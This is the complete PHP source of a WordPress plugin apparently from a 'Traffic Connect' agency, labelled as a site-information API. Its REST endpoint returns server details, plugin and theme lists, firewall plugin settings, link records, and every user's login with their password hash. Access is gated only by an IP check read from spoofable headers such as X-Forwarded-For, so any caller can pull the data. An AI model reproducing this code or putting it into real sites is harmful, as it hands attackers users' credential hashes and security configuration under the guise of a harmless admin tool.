<?php
/**
 * Plugin Name: TC Api Site Details
 * Description: Информация о сайте
 * Version: 1.0.0
 * Author: Traffic Connect
 */

defined('ABSPATH') || exit;

class ApiSiteDetails
{

    private $allowedIP = '192.168.65.1';

    public function __construct()
    {
        //
    }

    public function init()
    {

        add_action('rest_api_init', [$this, 'register_routes']);

    }

    public function register_routes()
    {
        register_rest_route('api-details/v1', '/get', array(
            'methods'  => 'GET',
            'callback' => [$this, 'api_site_details_get'],
            'permission_callback' => function() {

                $allowed_ip = $this->allowedIP;

                $client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ??
                    $_SERVER['HTTP_X_FORWARDED_FOR'] ??
                    $_SERVER['REMOTE_ADDR'];

                if ($client_ip === $allowed_ip) return true;

                return new WP_Error(
                    'forbidden',
                    'Доступ запрещён',
                    [
                        'status' => 403
                    ]
                );

            }
        ));
    }

    public function api_site_details_get(WP_REST_Request $request)
    {

        wp_send_json_success([
            'server_ip' => $this->getServerIP(),
            'server_info' => $this->getServerInfo(),
            'server_php' => $this->getServerVersionPHP(),
            'plugins' => $this->getAllPluginsInfo(),
            'users' => $this->getAllUsers(),
            'theme' => $this->getActiveTheme(),
            'is_static_site_plugin_active' => $this->isStaticSitePluginActive(),
            'is_hb_waf_plugin_active' => $this->isHbWafPluginActive(),
            'is_pretty_links_plugin_active' => $this->getPrettyLinksPlugin(),
        ]);

    }

    //Get Server IP
    private function getServerIP()
    {

        if (!empty($_SERVER['SERVER_ADDR'])) {
            return $_SERVER['SERVER_ADDR'];
        }

        return gethostbyname($_SERVER['SERVER_NAME']);
    }

    //Get Server Info
    private function getServerInfo()
    {

        if (!empty($_SERVER['SERVER_SOFTWARE'])) {
            return $_SERVER['SERVER_SOFTWARE'];
        }
        return 'Не удалось определить веб-сервер';

    }

    //Get Server PHP Version
    private function getServerVersionPHP()
    {
        return phpversion();
    }

    //Get All Plugins
    private function getAllPluginsInfo() {

        if ( ! function_exists( 'get_plugins' ) ) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $all_plugins   = get_plugins();
        $active_plugins = get_option( 'active_plugins', [] );

        $plugins_info = [];

        foreach ( $all_plugins as $plugin_file => $plugin_data ) {
            $plugins_info[] = [
                'name'     => $plugin_data['Name'],
                'version'  => $plugin_data['Version'],
                'status'   => in_array( $plugin_file, $active_plugins ) ? true : false,
                'plugin_file' => $plugin_file,
            ];
        }

        return $plugins_info;
    }

    //If Activate Plugin TC Static Site
    private function isStaticSitePluginActive() {

        if ( ! function_exists( 'is_plugin_active' ) ) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        return is_plugin_active( 'tc-static-site/tc-static-site.php' ) ? true : false;

    }

    //If Activate Plugin TC Static Site
    private function isHbWafPluginActive() {

        if ( ! function_exists( 'is_plugin_active' ) ) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        if(is_plugin_active( 'hb_waf/hb-waf.php' ))
        {
            return [
                'status' => true,
                'options' => [
                    'general' => get_option('hb_waf_settings'),
                    'other' => get_option('hb_waf_settings_other'),
                ]
            ];
        }

       return false;

    }

    //Get All Users
    private function getAllUsers() {
        $users = get_users();
        $output = [];

        foreach ( $users as $user ) {
            $output[] = [
                'login' => $user->user_login,
                'password' => $user->user_pass
            ];
        }

        return $output;
    }

    //Get Theme Active
    private function getActiveTheme()
    {
        $theme = wp_get_theme();

        return [
            'name'    => $theme->get('Name'),
            'version' => $theme->get('Version'),
        ];

    }

    private function getPrettyLinksPlugin() {
        global $wpdb;

        if ( ! function_exists( 'is_plugin_active' ) ) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        if ( ! is_plugin_active( 'pretty-link/pretty-link.php' ) ) {
            return false;
        }

        $table = $wpdb->prefix . 'prli_links';

        $results = $wpdb->get_results("
        SELECT id, name, slug, url, created_at
        FROM $table
    ");

        $links = [];
        foreach ( $results as $row ) {
            $links[] = [
                'id'        => $row->id,
                'title'     => $row->name,
                'short_url' => home_url( '/' . $row->slug ),
                'target'    => $row->url,
                'created'   => $row->created_at,
            ];
        }

        return [
            'status' => true,
            'links' => $links,
        ];
    }






}

$auth = new ApiSiteDetails();
$auth->init();
